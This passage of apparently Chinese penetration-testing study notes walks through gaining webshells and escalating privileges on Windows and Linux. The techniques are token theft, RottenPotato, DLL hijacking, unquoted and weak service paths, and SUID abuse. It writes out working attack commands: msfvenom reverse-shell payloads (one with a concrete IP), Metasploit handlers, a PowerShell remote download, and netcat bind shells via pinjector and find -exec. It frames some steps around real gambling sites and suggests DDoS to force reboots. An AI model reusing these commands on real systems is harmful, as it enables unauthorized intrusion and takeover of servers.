权限分类</h2><p><strong>后台权限</strong></p><ol><li>获得方式：<strong>爆破，注入猜解，弱口令</strong>等获取的帐号密码配合登录</li><li>一般网站或应用后台只能操作应用的界面内容数据图片等信息，无法操作程序的源代码或服务器上的资源文件的。（如后台功能存在文件操作的话也可以操作文件数据）</li></ol><p><strong>网站权限</strong></p><ol><li>获得方式：<strong>爆破，注入猜解，弱口令</strong>等获取的帐号密码配合登录</li><li>查看或修改程序源代码，可以进行网站或应用的配置文件读取（<strong>接口配置信息，数据库配置信息等</strong>），还能收集服务器操作系统相关的信息，为后续系统提权做准备。</li></ol><p><strong>数据库权限</strong></p><p>操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配置文件读取获得。</p><p><strong>接口权限</strong></p><p>邮件，短信，支付，第三方登录等，一旦截获，我们就可以利用这个接口对他人进行攻击。</p><p><strong>系统权限</strong></p><p><strong>域控权限</strong></p><blockquote><p>后台或网站权限后的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取），具体可以操作的事情大家自己想想。</p></blockquote><h1 id="webshell"><a class="markdownIt-Anchor" href="#webshell"></a> Webshell</h1><h2 id="获得权限的思路"><a class="markdownIt-Anchor" href="#获得权限的思路"></a> 获得权限的思路</h2><ol><li>寻找网站特征，判断cms，查找历史漏洞</li><li>若判断不了，搜集信息，搜集配置文件与源码，审计功能点</li><li>查找功能点，看有没有getshell的可能<ol><li>上传</li><li>sql注入</li><li>RCE等等</li></ol></li></ol><h2 id="某挂壁程序后台权限提升-后台功能"><a class="markdownIt-Anchor" href="#某挂壁程序后台权限提升-后台功能"></a> 某挂壁程序后台权限提升-后台功能</h2><ul><li><strong>前提：已经获取了后台账号密码</strong>（获得方式：爆破，注入猜解，弱口令等获取的帐号密码配合登录 ）</li></ul><p>后台权限和网站权限不同，后台权限不能对网站代码的层次进行修改</p><p>分析网站的CMS，</p><ul><li><p><strong>已知cms</strong></p><ol><li>在网上搜索CMS对应的漏洞，尝试复现。</li><li>网上未能找到相应版本漏洞，下载网站源码，进行代码审计，进行分析，寻找可以提权的漏洞</li><li>用功能点配合网站源码进行测试，在上传点抓包找到对应的代码</li></ol></li><li><p><strong>未知cms</strong></p><p>没有代码：直接常规测试，测试围绕文件上传、模板修改、SQL执行、数据备份等功能</p></li></ul><h2 id="某-bc-广告导航页权限提升-漏洞层面"><a class="markdownIt-Anchor" href="#某-bc-广告导航页权限提升-漏洞层面"></a> 某 BC 广告导航页权限提升-漏洞层面</h2><p>信息收集，发现中间件有漏洞</p><p>抓包了解网站使用的Apache和OpenSSL版本，凭借经验发现是基于PHPstudy的网站。根据网络资料<strong>复现PHPstudy的后门漏洞</strong>，实现命令执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache 2.4.** Mysql 5.*** PHP 5.***</span><br></pre></td></tr></table></figure><h2 id="glassfish-中间件-第三方"><a class="markdownIt-Anchor" href="#glassfish-中间件-第三方"></a> GlassFish 中间件-第三方</h2><p>通过FOFA信息收集，搜索使用GlassFish的网站作为目标根据网络资料复现GlassFish的任意文件读取漏洞（注意使用条件是否匹配）获取敏感信息，进行下一步渗透</p><h1 id="服务器权限"><a class="markdownIt-Anchor" href="#服务器权限"></a> 服务器权限</h1><h2 id="win提权"><a class="markdownIt-Anchor" href="#win提权"></a> WIN提权</h2><h3 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h3><h4 id="权限划分"><a class="markdownIt-Anchor" href="#权限划分"></a> 权限划分</h4><p><strong>普通权限</strong></p><p>一般系统分为七个组，每个组有对应不同的操作权限。<strong>管理员组(Administrators)、高权限用户组(Power Users)、普通用户组(Users)、身份验证用户组(Ahthenticated users)、来宾用户组(Guests)</strong>、<em>文件复制组(Replicator)、备份操作组(Backup Operators)</em></p><ul><li>管理员组拥有大部分的计算机操作权限(并不是全部)，能够随意修改删除所有文件和修改系统设置只有程序信任组（特殊权限）</li><li>来宾用户组的文件操作权限和普通用户组一样，但是无法执行更多的程序。</li><li>身份验证用户组(Ahthenticated users) 经过ms验证程序登录的用户均属于此组。</li></ul><p><strong>特殊权限</strong></p><p>出了上述，还有系统的特殊成员：<strong>SYSTEM(系统)、Trustedinstaller（信任程序模块）、Everyone(所有人)、CREATOR OWNER(创建者)</strong> 。这些特殊成员不被任何内置用户组吸纳，属于完全独立出来的账户。</p><ul><li>真正拥有“完全访问权”的只有一个成员:SYSTEM</li></ul><h4 id="基础命令"><a class="markdownIt-Anchor" href="#基础命令"></a> 基础命令</h4><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td><code>systeminfo</code></td><td>打印系统信息</td></tr><tr><td><code>whoami</code></td><td>获得当前用户名</td></tr><tr><td><code>whoami /priv</code></td><td>当前账户权限</td></tr><tr><td><code>ipconfig</code></td><td>网络配置信息</td></tr><tr><td><code>ipconfig /displaydns</code></td><td>显示DNS缓存</td></tr><tr><td><code>route print</code></td><td>打印出路由表</td></tr><tr><td><code>arp -a</code></td><td>打印arp表</td></tr><tr><td><code>hostname</code></td><td>主机名</td></tr><tr><td><code>net user</code></td><td>列出用户</td></tr><tr><td><code>net user &lt;UserName&gt;</code></td><td>关于用户的信息</td></tr><tr><td><code>net use \SMBPATHPa$$w0rd/u:UserName</code></td><td>连接SMB</td></tr><tr><td><code>net localgroup</code></td><td>列出所有组</td></tr><tr><td><code>net localgroup GROUP</code></td><td>关于指定组的信息</td></tr><tr><td><code>net view\127.0.0.1</code></td><td>会话打开到当前计算机</td></tr><tr><td><code>net session</code></td><td>开放给其他机器</td></tr><tr><td><code>netsh firewall show config</code></td><td>显示防火墙配置</td></tr><tr><td><code>DRIVERQUERY</code></td><td>列出安装的驱动</td></tr><tr><td><code>Tasklist /svc</code></td><td>列出服务任务</td></tr><tr><td><code>net start</code></td><td>列出启动的服务</td></tr><tr><td><code>dir/s foo</code></td><td>在目录中搜索指定字符的项</td></tr><tr><td><code>dir/s too==bar</code></td><td>同上</td></tr><tr><td><code>sc query</code></td><td>列出所有服务</td></tr><tr><td><code>sc qc ServiceName</code></td><td>找到指定服务的路径</td></tr><tr><td><code>shutdown /r/t 0</code></td><td>立即重启</td></tr><tr><td><code>type file.txt</code></td><td>打印出内容</td></tr><tr><td><code>Icacls “C:\Example”</code></td><td>列出权限</td></tr><tr><td><code>wmic qfe getCaption, Description,HotFixID,InstalledOn</code></td><td>列出已安装的补丁</td></tr><tr><td><code>(NewObject System.Net.WebClient).DownloadFile( “https://host/file&quot;/&quot;C:\LocalPath&quot;)</code></td><td>利用ps远程下载文件到本地</td></tr><tr><td><code>accesschk. exe-qwsu&quot;Group&quot;</code></td><td>修改对象(尝试Everyone，Authenticated Users和/或users)</td></tr></tbody></table><h3 id="web-shell提权思路"><a class="markdownIt-Anchor" href="#web-shell提权思路"></a> WEB-shell提权思路</h3><ol><li><p>前提是获得web权限</p></li><li><p>判断是什么系统，是服务器（2012 2003等等）还是个人主机（xp win7/10），判断当前权限</p><p>一般使用<code>systeminfo</code>（打了啥补丁）、<code>whoami /priv</code>（能做啥操作）</p></li><li><p>判断是否存在补丁，验证未打的补丁是否有的是<strong>权限提升</strong>/bypass的。</p><p>使用脚本：<a href="https://github.com/zhzyker/vulmap">Vulmap</a>、<a href="https://github.com/bitsadmin/wesng">Wes</a>、<a href="https://github.com/chroblert/WindowsVulnScan">WindowsVulnScan</a>使用KBCollect.ps1</p><p>Wes和WindowsVulnScan是python脚本（自己的环境有就行）</p></li><li><p>辅助工具：</p><ul><li><a href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a></li></ul></li></ol><p>发现exp后，使用msf反弹shell连接即可。以上是web上的提权方法。如果看到的补丁是主机层面的提权，则需要以下思路。</p><p>至于为什么会有两种方法？例如本地提权，如果使用的是新建窗口进行提权的，那么在web并不适用，因为没办法连接到新的cmd。</p><h3 id="本地提权思路溢出漏洞atscps"><a class="markdownIt-Anchor" href="#本地提权思路溢出漏洞atscps"></a> 本地提权思路——溢出漏洞/AT/SC/PS</h3><p>溢出漏洞的使用，msf已经足够了解了。有些漏洞可能只适应于本地环境提权，不适用于web环境提权。有些提权方法借助系统上的设计，逻辑上的问题来实现，并不总是依靠漏洞。</p><p>前提已经获得计算机的普通用户权限，较老的计算机系统，视频以Win2003为例，参考：<a href="https://blog.csdn.net/weixin_40412037/article/details/121535553">windows权限提升——AT、SC、PS命令提权</a></p><h4 id="at"><a class="markdownIt-Anchor" href="#at"></a> AT</h4><p><strong>适用范围：只针对Win7及之前的系统，从Win8开始不再支持at命令。</strong></p><p>打开cmd添加一项计划任务，在15:13打开一个cmd窗口，发现打开的窗口是system权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at 15:13 /interactive cmd.exe</span><br></pre></td></tr></table></figure><p>这是一个设计上的逻辑错误。<a href="https://blog.csdn.net/weixin_45677145/article/details/122061271?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-1.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-1.pc_relevant_default&amp;utm_relevant_index=2">Windows中使用命令创建计划任务（at、schtasks）</a></p><h4 id="sc"><a class="markdownIt-Anchor" href="#sc"></a> SC</h4><p><strong>适用范围：03/08、12/16</strong></p><p>创建一个名叫“syscmd”的服务，运行它，发现得到的cmd窗口是system权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc Create syscmd binPath= &quot;cmd /K start&quot; type= own type= interact</span><br><span class="line">sc start syscmd</span><br></pre></td></tr></table></figure><h4 id="ps"><a class="markdownIt-Anchor" href="#ps"></a> PS</h4><p><strong>适用范围：适用于Win2003 &amp; Win2008</strong></p><p>下载微软官方的<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">PsTools</a>工具包，在下载的文件夹下执行下面的命令，发现得到的cmd窗口是system权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -accepteula -s -i -d cmd.exe</span><br></pre></td></tr></table></figure><h3 id="令牌窃取及权限提升老"><a class="markdownIt-Anchor" href="#令牌窃取及权限提升老"></a> 令牌窃取及权限提升「老」</h3><p>主要发生在：windows2008 win7左右的系统，才能使用，现在应该就很少了。因为普通用户没办法通过令牌枚举来发现system或者administrator的令牌。所以没办法进行窃取。要发现这些令牌，可以使用烂土豆进行令牌模拟，这样就可以使用令牌窃取了。</p><p>一般都使用MSF进行令牌窃取，流程：</p><ol><li><p>在本地msf服务器上，执行以下命令，生成反弹shell木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=??? -f exe -o /root/xx.exe</span><br></pre></td></tr></table></figure></li><li><p>在本地msf服务器上执行以下命令，监听端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload  windows/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 6677</span><br><span class="line">show options</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li><li><p>将该木马xx.exe，上传到远程目标服务器，并运行木马程序。</p></li><li><p>本地监听到会话，查看权限为普通用户xiaodi</p></li><li><p>提权：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230621163747422.png" alt="image-20230621163747422" /></p></li></ol><h3 id="进程注入dll劫持老"><a class="markdownIt-Anchor" href="#进程注入dll劫持老"></a> 进程注入（DLL劫持）「老」</h3><p>Windows2003&amp;10 进程注入提升 进程注入提权是本地提权方式的一种较为老的安全技术了，<strong>利用的是注入进程的所有者实现权限共享机制</strong>，这类技术主要利用在 windows2008 之前操作系统上，所以我们需要学习后续的本地提权更多的手法才能有针对高版本的系统，因为是系统特性，所以不会被杀软拦截。</p><p><strong>pinjector 进程注入工具针对-win2008 以前操作系统</strong></p><ol><li><p>上传到目标机器</p></li><li><p>运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pinjector.exe 　　　　　　//运行命令，查看用法</span><br><span class="line">pinjector.exe -l  //列出可注入的进程</span><br><span class="line">pinjector.exe -p 416 cmd.exe 6688 // pinjector.exe -p pid cmd.exe 6688　注入到系统正常的服务里，监听6688端口（后面是否为system权限）</span><br><span class="line">nc 192.168.131.111 6688 // 监听6688端口，成功反弹shell，成功提权</span><br></pre></td></tr></table></figure></li></ol><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625101836817.png" alt="image-20230625101836817" style="zoom: 50%;" /><p>绑定：通过使用命令将权限绑定至system权限的进程中，这里选在进程最好绑定系统进程，这样能够实现开机自启。</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625101908888.png" alt="image-20230625101908888" style="zoom:50%;" /><blockquote><p>其原理是：查看这个软件运行了什么dll，我们就替换这个dll，当程序启动的时候，就会自动调用这个dll达到提权（如果这个软件的运行权限是system）</p></blockquote><h3 id="烂土豆ms16-075配合令牌窃取提权"><a class="markdownIt-Anchor" href="#烂土豆ms16-075配合令牌窃取提权"></a> 烂土豆MS16-075配合令牌窃取提权</h3><p>单纯令牌窃取：适用于web权限或本地提权，如配合烂土豆提权：适用于web或数据库等权限，因为这些权限才有模拟令牌的权限。</p><p>如果可以模拟令牌就可以枚举诸如system的令牌，就可以使用令牌窃取达成权限提升。</p><h4 id="rottenpotato原理"><a class="markdownIt-Anchor" href="#rottenpotato原理"></a> RottenPotato原理</h4><p>RottenPotato（烂土豆）提权的<strong>原理</strong>可以简述如下：</p><ol><li>欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。</li><li>对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。</li><li>模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。</li></ol><p>所以，一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。测试过程中，我发现使用已经建好的账户（就是上面说的用户级账户）去反弹meterpreter然后再去执行EXP的时候会失败，但使用菜刀（IIS服务器权限）反弹meterpreter就会成功。即<strong>非服务类用户权限无法窃取成功。</strong></p><p>具体权限（<code>whoami /priv</code>）/要求为：</p><ol><li>需要支持SeImpersonate或者SeAssignPrimaryToken权限（用来模拟令牌）</li><li>注意RPC端口</li><li><a href="http://xn--49sq66hcqa154b.NET">需要安装.NET</a> Framework</li></ol><p>烂土豆比热土豆的优点是：</p><ol><li>100%可靠</li><li>（当时）全版本通杀。</li><li>立即生效，不用像hot potato那样有时候需要等<strong>Windows更新</strong>才能使用。</li></ol><p>总之，我对这个的理解是通过中间人攻击，将COM（NT\SYSTEM权限）在第二步挑战应答过程中认证的区块改成自己的区块获取SYSTEM令牌，然后利用msf的模仿令牌功能模仿SYSTEM令牌。</p><p>烂土豆下载资源</p><p><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">windows-kernel-exploits/MS16-075 at master · SecWiki/windows-kernel-exploits (github.com)</a></p><p><a href="https://github.com/foxglovesec/RottenPotato">foxglovesec/RottenPotato: RottenPotato local privilege escalation from service account to SYSTEM (github.com)</a></p><h4 id="烂土豆提权流程"><a class="markdownIt-Anchor" href="#烂土豆提权流程"></a> 烂土豆提权流程</h4><p><strong>上传烂土豆----------&gt;执行烂土豆----------&gt;利用窃取模块----------&gt;窃取SYSTEM----------&gt;成功</strong></p><ol><li><p><a href="https://www.cnblogs.com/tianlinlin/p/10171981.html">上传后门</a>，生成一个后门，并上传到目标服务器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure></li><li><p>启动监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload  windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 5577</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li><li><p>受害机执行后门</p><p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230621171531434.png" alt="image-20230621171531434" /></p><p>确定当前为webshell权限。<code>getuid</code></p></li><li><p>单纯令牌窃取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span></span><br></pre></td></tr></table></figure><p>提权失败，单纯用令牌窃取提权需要有一定的权限，这里的权限太低。</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625094704731.png" alt="image-20230625094704731" style="zoom:50%;" /></li><li><p>借助烂土豆提权</p><ol><li><p>上传potato.exe</p></li><li><p>在刚才的test的基础之上，再执行potato.exe</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625094741213.png" alt="image-20230625094741213" style="zoom:80%;" /></li><li><p>执行即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\\</span><br><span class="line">execute -cH -f ./potato.exe</span><br><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h4 id="注意的点"><a class="markdownIt-Anchor" href="#注意的点"></a> 注意的点</h4><ol><li>单纯令牌窃取是在一定的权限下才能实施成功的，需要有枚举system令牌的权限。</li><li>如果是普通权限，则使用烂土豆可以将令牌进行模拟，再使用令牌窃取完成攻击</li></ol><h3 id="dll劫持提权应用配合msfweb权限"><a class="markdownIt-Anchor" href="#dll劫持提权应用配合msfweb权限"></a> DLL劫持提权应用配合MSF——web权限</h3><p>Windows程序启动的时候需要DLL库进行支持。如果这些DLL不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：</p><ul><li>1、应用程序加载的目录</li><li>2、C:\Windows\System32</li><li>3、C:\Windows\System</li><li>4、C:\Windows</li><li>5、当前工作目录 Current Working Directory，CWD</li><li>6、在 PATH 环境变量的目录（先系统后用户）</li></ul><p>CS中的使用Juicypotato提取，是使用DLL注入的方式执行Juicypotato实现权限提升，但是缺陷比较明显，只能使用默认的CLSID({4991d34b-80a1-4291-83b6-3328366b9097})进行提权,如果想使用其他CLSID请参考命令行等执行方法</p><h4 id="dll劫持提权流程"><a class="markdownIt-Anchor" href="#dll劫持提权流程"></a> DLL劫持提权流程</h4><p><strong>信息收集----------&gt;进程调试----------&gt;制作 dll 并上传----------&gt;替换 dll----------&gt;启动应用后成功</strong></p><ul><li><p>信息收集：服务器上有的第三方软件</p><p>一般看有什么程序的文件夹</p></li><li><p>进程调试：程序运行的事=时候调用了那些dll（火绒剑可以看）</p><p>一般一些写在system的dll是改不了的，所以看存在程序同名目录下的dll文件。</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625095218724.png" alt="image-20230625095218724" style="zoom:80%;" /></li></ul><ul><li><p>找到该dll，用msf生成木马进行替换：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp</span><br><span class="line">lhost=101.37.169.46 lport=6677 -f dll &gt;/opt/xiaodi.dll</span><br></pre></td></tr></table></figure></li><li><p>MSF启动监听，然后配合令牌窃取成功提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload  windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 6677</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure></li></ul><h4 id="注意"><a class="markdownIt-Anchor" href="#注意"></a> 注意</h4><ul><li>dll劫持提权需要<strong>特定软件应用的控制权限及启用配合</strong>，复杂鸡肋</li><li>AlwaysInstallElevated提权默认禁用配置，利用成功机会很少</li></ul><h3 id="不带引号服务路径配合msf"><a class="markdownIt-Anchor" href="#不带引号服务路径配合msf"></a> 不带引号服务路径配合MSF</h3><p>当 Windows 服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完 整路径，则系统会按字面解释它并执行，像这样。</p><p>带引号：</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625100010606.png" alt="image-20230625100010606" style="zoom:67%;" /><p>不带引号：</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625100053640.png" alt="image-20230625100053640" style="zoom:67%;" /><p>不带引号而且不安全的：</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625100611727.png" alt="image-20230625100611727" style="zoom: 67%;" /><p>一旦我们使用了不带引号的方式执行命令，且命令中路径包含空格，将会出现这种情况：</p><p>首先是正常的（我直接拖进来的程序）：</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625100313042.png" alt="image-20230625100313042" style="zoom:50%;" /><p>不正常的：</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625100425455.png" alt="image-20230625100425455" style="zoom:67%;" /><p>因为有空格，那么后面的字符串就被认为是参数，传入到Program这个“程序”中，然而，没有这个程序。如果我们自己伪造一个Program程序，那么即可执行！</p><h4 id="流程"><a class="markdownIt-Anchor" href="#流程"></a> 流程</h4><ol><li><p>使用msf制作一个后门，命名为Program.exe，上传到目标服务器C盘根目录</p></li><li><p>启动服务/重启。</p><p>启动服务。可以在webshell中或者本地启动服务。但是测试时，webshell中启动不了，所以不带引号服务路径提权方法还是多用于本地提权。</p><p>重启啥的，可以使用ddos攻击</p></li></ol><h3 id="不安全服务权限配合msf本地权限"><a class="markdownIt-Anchor" href="#不安全服务权限配合msf本地权限"></a> 不安全服务权限配合MSF——本地权限</h3><p>即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限。例如，可以直接修改它导致重定向执行文件。这样我们可以达到这样的效果：</p><ol><li><strong>修改服务项中的运行地址，将之从安全的，带引号的服务路径，变成不带引号的。</strong></li><li><strong>改成我们自己的木马地址</strong></li></ol><h4 id="流程-2"><a class="markdownIt-Anchor" href="#流程-2"></a> 流程</h4><p><strong>检测服务权限配置----------&gt;制作文件并上传----------&gt;更改服务路径指向----------&gt;调用后成功</strong></p><ol><li><p>检测服务权限配置</p><p>使用<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">accessChk</a>这个命令，他是官方的，所以不会被杀掉。执行命令，检测当前用户所在组的服务权限（实战中一般都不是administrators组，这里仅做测试用），列出的都是当前用户可以操作的服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uwcqv &quot;administrators&quot; *</span><br></pre></td></tr></table></figure><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625101243436.png" alt="image-20230625101243436" style="zoom:50%;" /></li><li><p>制作木马并上传</p></li><li><p>看到有哪些可以更改的服务，那就到该服务下，改其地址！</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625101309992.png" alt="image-20230625101309992" style="zoom:50%;" /><p>执行命令更改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc config &quot;NewServiceName&quot; binpath=&quot;C:\Program.exe&quot;</span><br></pre></td></tr></table></figure><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625101404246.png" alt="image-20230625101404246" style="zoom: 50%;" /></li><li><p>启动服务</p></li></ol><h2 id="linux提权"><a class="markdownIt-Anchor" href="#linux提权"></a> Linux提权</h2><p>与windows一样，也是有web和本地提权之分</p><h3 id="用户权限"><a class="markdownIt-Anchor" href="#用户权限"></a> 用户权限</h3><p>使用id查看：超过1000是普通用户</p><h3 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h3><p>包括：内核信息（<code>cat /proc/version</code>，<code>uname -a</code>）、用户群组（<code>id</code>，<code>who</code>，<code>cat /etc/group</code>）、环境信息（环境变量中可能存在密码或API密钥<code>cat /etc/profile</code>，<code>/etc/bashrc</code>）、进程服务、计划任务、有无ssh私钥（<code>cat ~/.ssh/authorized_keys</code>）、有无明文密码（配置文件，config之类的）、可读写执行目录。</p><p>自动化搜集：</p><ol><li>信息：<a href="https://github.com/rebootuser/LinEnum">LinEnum</a>（<code>./LinEnum.sh</code>），<a href="https://github.com/sleventyeleven/linuxprivchecker">linuxprivchecker</a>（<code>python2 linuxprivchecker.py -w -o linuxprivchecker.log</code>）</li><li>漏洞：<a href="https://github.com/mzet-/linux-exploit-suggester">linux-exploit-suggester</a>，<a href="https://github.com/jondonas/linux-exploit-suggester-2">linux-exploit-suggester2</a></li></ol><p>信息搜集有助于下一步的攻击、采取什么payload与攻击路线。</p><p>而LinEnum主要检测的，除了上述，就是一些特权访问的文件、作业、任务、一些web的版本信息等</p><h3 id="suid提权"><a class="markdownIt-Anchor" href="#suid提权"></a> SUID提权</h3><p>**SUID（set user id）是一种授予文件的权限类型，允许用户以其所有者的权限执行文件。**例如，ping实用程序需要root权限才能打开网络套接字，但它也需要由标准用户执行，以验证与其他主机的连接。通过将ping程序标记为SUID（所有者为root），只要标准用户执行ping程序，便会以root特权 执行ping。</p><p>但是如果某些现有的二进制文件和实用程序具有SUID权限，则可以使用它们将权限升级到root，我们可以使用它来提升我们的特权。</p><blockquote><p>之前遇到的：两个指令，一个是<code>cp</code>，一个是<code>unzip</code>，使用第一个指令，复制一个文件，那么我们就可以用自己的权限打开root才能打开的文件，第二个也是。</p></blockquote><p>允许权限提升的已知Linux可执行文件包括：</p><blockquote><p>Nmap / Vim / find / Bash / mv / More / Less / Nano / cp</p></blockquote><h4 id="流程-3"><a class="markdownIt-Anchor" href="#流程-3"></a> 流程</h4><ol><li><p>查找SUID可执行文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><p>他们的特征是：有个s在他们的权限中，就是以super权限执行的程序（针对可执行文件或目录，使文件在执行阶段，<strong>临时拥有文件所有者的权限</strong>）。而且他们own by root。</p><blockquote><p>如果是使用<code>chomod u+s ???</code>那就是SUID</p></blockquote><p>利用方式参考：<a href="https://pentestlab.blog/2017/09/25/suid-executables/">https://pentestlab.blog/2017/09/25/suid-executables/</a></p></li><li><p>特定SUID利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">touch xiaodi</span><br><span class="line">find xiaodi -exec whoami \;</span><br><span class="line">find xiaodi -exec netcat -lvp 5555 -e /bin/sh \;</span><br><span class="line"></span><br><span class="line">netcat xx.xx.xx.xx 5555</span><br></pre></td></tr></table></figure></li></ol><h3 